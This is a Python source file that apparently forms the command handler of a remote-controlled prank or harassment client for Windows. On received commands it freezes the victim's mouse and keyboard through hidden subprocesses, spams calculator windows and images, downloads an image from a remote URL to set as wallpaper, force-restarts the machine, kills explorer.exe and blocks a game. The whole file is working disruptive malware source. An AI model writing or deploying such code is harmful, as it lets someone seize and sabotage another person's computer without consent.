from implementations import *

import threading
import subprocess
import os
import sys

commandsWithArgs = ["CALCULATOR", "IMAGE", "TEXT"]
image_url = "https://res.cloudinary.com/dnkpzafxp/image/upload/image_jtpkzq.png"

app = QtWidgets.QApplication(sys.argv)
dispatcher = MessageDispatcher()

def handle_message(msg, block_exe, valorantblock_exe, state, startupinfo, creationflags):
    parts = msg.split("|")
    command = parts[0]
    arg1 = parts[1] if len(parts) > 1 else None

    if "|" in msg and command not in commandsWithArgs:
        print("Invalid Command!")
        return

    print("Received command:", msg)

    if command == "FREEZE_MOUSE":
        if state["mouse"] is None or state["mouse"].poll() is not None:
            state["mouse"] = subprocess.Popen(
                [block_exe, "FREEZE_MOUSE"],
                creationflags=subprocess.CREATE_NO_WINDOW,
                startupinfo=startupinfo
            )

    elif command == "UNFREEZE_MOUSE":
        if state["mouse"] and state["mouse"].poll() is None:
            state["mouse"].terminate()
            state["mouse"] = None

    elif command == "FREEZE_KEYBOARD":
        if state["keyboard"] is None or state["keyboard"].poll() is not None:
            state["keyboard"] = subprocess.Popen(
                [block_exe, "FREEZE_KEYBOARD"],
                creationflags=creationflags,
                startupinfo=startupinfo
            )

    elif command == "UNFREEZE_KEYBOARD":
        if state["keyboard"] and state["keyboard"].poll() is None:
            state["keyboard"].terminate()
            state["keyboard"] = None

    elif command == "IMAGE":
        if arg1 and arg1.isdigit():
            spam_image(int(arg1))
        else:
            spam_image()
    
    elif command == "AUDIO":
        play_audio()

    elif command == "CHANGE_WALLPAPER":
        download_image(image_url)
        set_wallpaper(os.path.join(os.environ["USERPROFILE"], "Videos", "trabuco.png"))

    elif command == "CALCULATOR":
        if arg1 and arg1.isdigit():
            spam_calculators(int(arg1))
        else:
            spam_calculators()

    elif command == "FORCE_RESTART":
        restart_pc()

    elif command == "SAFE_RESTART":
        safe_restart_pc()

    elif command == "COOK_PC_UI":
        os.system("taskkill /f /im explorer.exe")

    elif command == "BLOCK_VALORANT":
        if state["valorant"] is None or state["valorant"].poll() is not None:
            state["valorant"] = subprocess.Popen(
                [valorantblock_exe],
                creationflags=subprocess.CREATE_NO_WINDOW,
                startupinfo=startupinfo
            )

    elif command == "UNBLOCK_VALORANT":
        if state["valorant"] and state["valorant"].poll() is None:
            state["valorant"].terminate()
            state["valorant"] = None

    elif "TEXT_" in command:
        # TEXT_(text)|(opt secs)
        argspc = msg.split("_")

        if len(argspc) > 2 and argspc[2].isdigit():
            dispatcher.show_message.emit(argspc[1], int(argspc[2]))
        else:
            dispatcher.show_message.emit(argspc[1], 5)

    elif command == "BYE":
        os.kill(os.getpid(), 9)